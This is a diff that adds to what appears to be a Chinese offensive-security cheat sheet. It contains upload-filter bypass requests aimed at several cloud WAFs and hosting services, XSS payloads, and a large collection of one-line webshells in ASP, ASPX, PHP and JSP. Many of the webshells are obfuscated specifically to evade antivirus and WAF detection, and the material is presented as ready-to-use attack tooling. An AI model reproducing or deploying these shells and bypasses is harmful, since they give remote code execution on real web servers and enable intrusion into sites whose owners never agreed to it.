@@ -282,5 +282,330 @@ boundary后面加入空格。
 使用UTF-16、Unicode、双URL编码等等  
 
 -----
+WTS-WAF 绕过上传  
+原内容：  
+Content-Disposition: form-data; name="up_picture"; filename="xss.php"  
+添加回车  
+Content-Disposition: form-data; name="up_picture"; filename="xss.php"  
 
+----
+百度云上传绕过  
+百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，    
+一句话自己合成图片马用Xise连接即可。  
+Content-Disposition: form-data; name="up_picture"; filename="xss.jpg .Php"  
+
+----
+阿里云上传绕过  
+源代码：
+Content-Disposition: form-data; name="img_crop_file"; filename="1.jpg   
+.Php"Content-Type: image/jpeg  
+修改如下：  
+Content-Disposition: form-data; name="img_crop_file"; filename="1.php"  
+没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。  
+
+----
+360主机上传绕过  
+源代码:  
+Content-Disposition: form-dat a;name="image";   
+filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png  
+绕过内容如下：  
+Content- Disposition: form-data; name="image";   
+filename="085733uykwusqcs8vw8wky.png  
+
+加几个空格 删content-type  
+
+-----
+xss    
+1 PDF-XSS  
+1. 这里使用的是迅捷PDF编辑器（不是PDF转换器）。   
+2. 从空白页新建文档。  
+
+2 HTML-XSS  
+<html>  
+    <body>  
+    <img src=1 onerror=alert("test")>  
+    </body>  
+
+</html>  
+
+3 SVG-XSS  
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>  
+
+---
+一句话木马 getshell 
+asp
+
+<% response.write("hello,world") %>
+<%eval request("pass")%>
+
+aspx
+
+ <%@ Page Language="C#"%>
+<% Response.Write("hello,world"); %>
+
+<%@ Page Language="Jscript" validateRequest="false" %>
+<%
+function xxxx(str)
+{
+    return eval(str,"unsafe");
+}
+%>
+<%var a = Request.Item["pass"];%>
+<%var b = xxxx(a);%>
+<%Response.Write(b);%>
+
+
+php
+
+<?php echo"hello world";?>
+<?php @eval($_POST['pass']);?>
+
+jsp
+
+<%
+out.println("Hello World");
+%>
+
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+ 
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("pass");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%>
+
+<?php assert(@$_POST['a']); ?>
+
+
+<?php
+$fun = create_function('',$_POST['a']);
+$fun();
+?>
+
+
+<?php
+$bb="eval";
+$aa="bb";
+$$aa($_POST['a']);
+?>
+
+
+<?php
+$a=base64_decode("ZXZhbA==")
+$a($_POST['a']);
+?>
+
+<?php
+$a="e"."v";
+$b="a"."l";
+$c=$a.$b;
+$c($_POST['a']);
+?>
+
+<script language="php">@eval_r($_GET[b])</script>
+
+一句话木马：ASP篇
+ 
+
+ASP一句话木马收集：
+
+ <%eval request ("admin")%>
+
+<%eval request("chopper")%>
+
+<%execute request("chopper")%>
+
+<%execute(request("chopper"))%>
+
+<%ExecuteGlobal request("chopper")%>
+
+<%Eval(Request(chr(35)))%>
+
+<%dy=request("c")%><%Eval(dy)%> 
+
+<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%> 
+
+<% if Request("c")<>"" then ExecuteGlobal request("c") end if %>
+
+<%execute request("c")%><%'<% loop <%:%>
+
+< %'<% loop <%:%><%execute request("a")%>
+
+<script language=vbs runat=server>eval(request("c"))</script> 
+
+<script language=VBScript runat=server>execute request("#")</script> 
+
+<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("c"))%>
+
+<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>
+
+<%execute(unescape("eval%20request%28%22aaa%22%29"))%>
+
+UTF-7编码加密:
+<%@ codepage=65000%><% response.Charset=”936″%><%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%>
+ 
+Script Encoder 加密  //密码c
+<%@ LANGUAGE = VBScript.Encode %>
+<%#@~^PgAAAA==~b0~"+$E+kYvEmr#@!@*rJ~O4+x,36mEDn!VK4mV~Dn5!+dYvEmr#~n NPrW,SBMAAA==^#~@%>
+
+ 
+
+这段代码将"eval request(/*/z/*/)"逆序成")/*/z/*/(tseuqer lave", 以逃避特征码查杀, 当脚本被访问, 其代码会被动态的解码还原成原始的一句话后门. 当前90%以上的未知后门和变形后门都是使用此类动态解码技术
+
+<%
+Function MorfiCoder(Code)
+MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
+End Function
+Execute MorfiCoder(")/*/z/*/(tseuqer lave")
+%>
+
+ 密码 z
+
+ 
+
+可以躲过雷客图的一句话木马：
+
+<%set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
+ms.Language="VBScript"
+ms.AddObject "Response", Response
+ms.AddObject "request", request
+ms.AddObject "session", session
+ms.AddObject "server", server
+ms.AddObject "application", application
+ms.ExecuteStatement ("ex"&"e"&"cute(request(chr(35)))")%>
+
+ 
+
+<%
+password=Request("class")
+Execute(AACode("457865637574652870617373776F726429")):Function AACode(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute("AACode=AACode&chr(&H"&c&")"):Else:Execute("AACode=AACode&chr(&H"&c&Mid(s,i+2,2)&")"):i=i+2:End If:Next:End Function
+%>
+
+
+<%
+password=Request("class")
+Execute(DeAsc("%87%138%119%117%135%134%119%58%130%115%133%133%137%129%132%118%59")):Function DeAsc(Str):Str=Split(Str,"%"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function
+%>
+
+ 
+
+简单的aspx免杀
+
+<%@ Page Language="Jscript"%> <%eval(Request.Item["shell"],"unsafe");%>
+
+
+复制代码
+<%@ Page Language="Jscript"%>
+<%
+var a = Request.Item["M"];
+var b = "un" + Char ( 115 ) + Char ( 97 ) + "fe";//主要就是这个地方 其他地方好像不会管
+eval(a,b);
+Response.Write("Test");
+%>
+复制代码
+ 
+
+ 
+
+过狗一句话：
+
+复制代码
+<%
+dim play
+'
+'
+''''''''''''''''''
+'''''''''
+play = request("#")
+%>
+Error
+<%
+execute(play)
+%>
+
+jsp的一句话木马
+
+asp打印hello
+<% response.write("hello,world") %>
+
+aspx打印hello
+<%@ Page Language="C#"%>
+<% Response.Write("hello,world"); %>
+
+php打印hello
+<?php echo"hello world";?>
+
+jsp打印hell
+<%
+out.println("Hello World");
+%>
+
+asp一句话
+<%eval request("pass")%>
+
+aspx一句话
+
+<%@ Page Language="Jscript" validateRequest="false" %>
+<%
+function xxxx(str)
+{
+    return eval(str,"unsafe");
+}
+%>
+<%var a = Request.Item["pass"];%>
+<%var b = xxxx(a);%>
+<%Response.Write(b);%>
+
+php一句话
+<?php @eval($_POST['pass']);?>
+
+jsp一句话
+
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+ 
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("pass");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%>
 
